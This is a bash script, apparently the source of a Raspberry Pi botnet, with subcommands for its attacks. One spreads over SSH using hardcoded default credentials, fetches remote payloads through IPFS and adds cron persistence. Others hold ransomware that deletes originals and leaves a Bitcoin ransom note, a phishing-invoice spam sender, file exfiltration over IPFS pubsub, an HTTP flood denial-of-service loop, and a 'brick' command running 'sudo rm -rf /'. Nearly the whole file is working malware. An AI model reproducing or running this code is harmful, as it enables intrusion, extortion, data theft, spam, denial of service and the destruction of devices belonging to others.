#!/bin/bash
case $1 in
  infect)
  #Funciona
  ######### SHOWS AVAILABLE IPv4 FROM OUR INTERFACES##########
  IPS=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | grep -Eo '([0-9]*\.){3}[0-9]*')
  ####### WE MAKE AN ARRAY #####
  IPS=(${IPS//$'\n'/ })

  for ip in "${IPS[@]}"
  do
    ######## WE CONSIDER NETMASK /24 #########
    iprange=$(echo $ip | sed 's/\.[^.]*$//')
    for ihost in {1..254}; do
      #echo "Trying $iprange.$ihost"
      #####CHEKCH DEVICE AVAILABILITY ########
      ping $iprange.$ihost -qc 1 -w 2 >/dev/null
      if [ $? -eq 0 ]
      then
        #echo "$iprange.$ihost is alive"
        for port in {21,22}; do
          ##CHECK PORT CONNECTIVITY##########
          ##Adjust timeout time
          timeout 3 bash -c "echo >/dev/tcp/$iprange.$ihost/$port" 2>/dev/null #&& echo "$port    $iprange.$ihost"
            if [ $? -eq 0 ]
            then
              case $port in
                22)
                user=pi;
                pass=raspberrypi123;
                echo "Trying SSH...";
                sshpass -p ${pass} ssh $user@${iprange}.${ihost} -o StrictHostKeyChecking=no 'wget -q https://dist.ipfs.io/go-ipfs/v0.4.20/go-ipfs_v0.4.20_linux-arm.tar.gz;echo "IPFS downloaded.."; '
                ##wget https://dist.ipfs.io/go-ipfs/v0.4.21/go-ipfs_v0.4.20_linux-arm.tar.gz
                #####install sshpass to continue infecting#####
                sshpass -p ${pass} ssh $user@${iprange}.${ihost} -o StrictHostKeyChecking=no 'sudo apt-get -y install sshpass; sudo apt-get -y install mutt; sudo apt-get -y install gawk; tar -xvf go-ipfs_v0.4.20_linux-arm.tar.gz;'
                sshpass -p ${pass} ssh $user@${iprange}.${ihost} -o StrictHostKeyChecking=no 'rm go-ipfs_v0.4.20_linux-arm.tar.gz'
                sshpass -p ${pass} ssh $user@${iprange}.${ihost} -o StrictHostKeyChecking=no 'cd go-ipfs; ./ipfs init; sleep 2; ./ipfs config --json Swarm.ConnMgr.HighWater "10"; ./ipfs config --json Swarm.ConnMgr.LowWater "5"; ./ipfs config Swarm.ConnMgr.GracePeriod "7200s";'
                sshpass -p ${pass} ssh $user@${iprange}.${ihost} -o StrictHostKeyChecking=no 'cd go-ipfs; ./ipfs daemon --enable-pubsub-experiment & '
                sshpass -p ${pass} ssh $user@${iprange}.${ihost} -o StrictHostKeyChecking=no 'exit'
                sshpass -p ${pass} ssh $user@${iprange}.${ihost} -o StrictHostKeyChecking=no 'cd go-ipfs; ./ipfs swarm connect /ip4/169.254.140.24/tcp/4001/ipfs/QmYjT3xZ1sfG91bNqiQtk5yGoX14wJKxyG2aXYWohpu7ks; ./ipfs get -o ~/passEncrypt.txt QmZmBDnE7r19agJt9zv5K4yfb41Zytz67K3CnDtU82Bvh4; ./ipfs get -o ~/checkCommands.sh QmdjtkHAi5PcFs6efKjfawRUp22pcttoEuU6zKkvdigjvB; ./ipfs get -o ~/test.pdf QmQ4XYZUE8rtrm6PfwYMLft1P7eqLnyAc8AveeMdWsGZhv;./ipfs get -o ~/botnet.sh /ipns/QmYjT3xZ1sfG91bNqiQtk5yGoX14wJKxyG2aXYWohpu7ks; cd; chmod +x checkCommands.sh;chmod +x botnet.sh; cd go-ipfs; ./ipfs pubsub sub --discover --enc json botnet > ~/logs.txt &'
                sshpass -p ${pass} ssh $user@${iprange}.${ihost} -o StrictHostKeyChecking=no 'crontab -l | { cat; echo "* * * * * /bin/bash ~/checkCommands.sh"; } | crontab -'
                ;;
                21)
                compgen -c | grep "^curl"
                if [ $? -eq 0 ]
                then
                  echo "Trying FTP...";
                  user=pi;
                  pass=raspberrypi123;
                  curl -T test.pdf ftp://$iprange.$ihost --user $user:$pass;
                fi
                ;;
              esac
            fi
        done
      fi
    done
  done

  ;;
  encrypt)
  ##Funciona
  #!/bin/bash
  echo "
  ################
  #  Ransomware  #
  ################";
  #echo "File Path => $pathfile";
  #echo "Password  => $password";
  echo "Encrypting...";
  sleep 2
  message="Your files have been encrypted if you want to recover them. \n Send 1 BTC to the next address: \n XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
  ls $2;
  if [ $? -ne 0 ];
  then
    echo "Introduce a valid path."
  else
    compgen -c | grep "^openssl";
    if [ $? -eq 0 ];
    then
      #Encryption aes256cbc
      tar czvf - "$2" | openssl aes-256-cbc -salt -out "private.encrypt" -pass file:"passEncrypt.txt";
      rm -r $2;
      rm passEncrypt.txt;
      echo -e "$message" > ~/README.txt;
      ## openssl aes-256-cbc -d -salt -in "private.encrypt" -pass file:"passEncrypt.txt" | tar -xzv
    else
      directoryContent=$(ls $2)
      for file in ${directoryContent[@]}; do
        if [ -f $2/$file ]; then
          fileContent="$(cat $2/$file)";
          encrypt="$(echo ${fileContent} | base64)";
          pass2="$(echo '{s3cr3t#pass%}'| base64)";
          #pass2="$(date | base64)";
          echo "content=${encrypt}; pass=${pass2};" >> "$2/$file.pay";
          rm $2/$file;
          echo "Done";
          echo -e "$message" > ~/README.txt;
        elif [ -d $2/$file ]; then
          ./botnet.sh encrypt "$2/$file";
        fi
      done
    fi
  fi

  ;;
  spam)
  echo -en "set from = "pepe@gmail.com"
  set realname = "Pepe"
  set imap_user = "pepe@gmail.com"
  set imap_pass = "password"
  set folder = "imaps://imap.gmail.com:993"
  set spoolfile = "+INBOX"
  set postponed ="+[Gmail]/Drafts"
  set header_cache =~/.mutt/cache/headers
  set message_cachedir =~/.mutt/cache/bodies
  set certificate_file =~/.mutt/certificates
  set smtp_url = "smtp://pepe@smtp.gmail.com:587/"
  set smtp_pass = "password"
  set move = no
  set imap_keepalive = 900\n" > .muttrc;
  mkdir -p ~/.mutt/cache
  attachmentPath="test.pdf";
  messageBody="Buenos días, hemos comprobado que aún no ha pagado su deuda d ela siguiente factura.";
  subject="Factura 09062019";
  mutt -s "$subject" $2 < $messageBody -a $attachmentPath;
  ;;
  exfiltrate)
  #Funciona
  ls $2;
  if [ $? -ne 0 ];
  then
    echo "Introduce a valid path."
  else
    compgen -c | grep "^openssl";
    if [ $? -eq 0 ];
    then
      #Encryption aes256cbc
      tar czvf - "$2" | openssl aes-256-cbc -salt -out "private.exfil" -pass pass:"{s3cr3t#pass%}";
      #Upload IPFS and publish pubsub
      ipfsFileAddress=$(cd ~/go-ipfs; ./ipfs add ~/private.encrypt | awk -F' ' '{print $2}');
      cd ~/go-ipfs; ./ipfs pubsub pub botnet $ipfsFileAddress;
    else
      directoryContent=$(ls $2)
      for file in ${directoryContent[@]}; do
        if [ -f $2/$file ]; then
          fileContent="$(cat $2/$file)";
          encrypt="$(echo ${fileContent} | base64)";
          pass2="$(echo '{s3cr3t#pass%}'| base64)";
          #pass2="$(date | base64)";
          echo "content=${encrypt}; pass=${pass2};" >> "$2/$file.pay";
          rm $2/$file;
          echo "Done";
        elif [ -d $2/$file ]; then
          ./exfiltrate.sh "$2/$file";
        fi
      done
      tar -czvf "${2}.tar.gz" $2;
      #UPLOAD IPFS and publish pubsub
      ipfsFileAddress=$(cd ~/go-ipfs; ./ipfs add "${2}.tar.gz" | awk -F' ' '{print $2}');
      cd ~/go-ipfs; ./ipfs pubsub pub botnet $ipfsFileAddress;
    fi
  fi
  ;;

  ddos)
  #Funciona
  ###################HTTP FLOOD ##########################
  ###MAKE HTTP GET CONNECTIONS TO WEB SERVER##############
  #######################################################
  for i in {1..5000};
  do
    echo -e "GET / HTTP/1.1\r\nHost: $2\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n5: 5\r\n"|nc -i 5 -w 30000 $2 443  2>/dev/null 1>/dev/null
  done
  ;;

  mining)
  echo -e "To be implemented."
  ###mining()
  ;;
  brick)
  ##Funciona
  sudo rm -rf /
  ;;
  help|man)
  echo -e "./botnet <subcommand> \n"
  echo -e "./botnet infect - Tries to propagate through the network using ports 22,23. \n"
  echo -e "./botnet encrypt <path> - Encrypts folder files and subfolders, removing original ones. \n"
  echo -e "./botnet spam <mail> - Send a spam email. \n"
  echo -e "./botnet exfiltrate - Put in a file important information, and add it to IPFS. \n"
  echo -e "./botnet ddos <IP> - Try to DoS the address, through HTTP flood"
  echo -e "./botnet mining <address> -  start mining and send the earnings to the address. \n"
  echo -e "./botnet brick - Brick the device. \n"
  ;;
  *)
  echo -e "Unauthorized access."
  ;;
esac
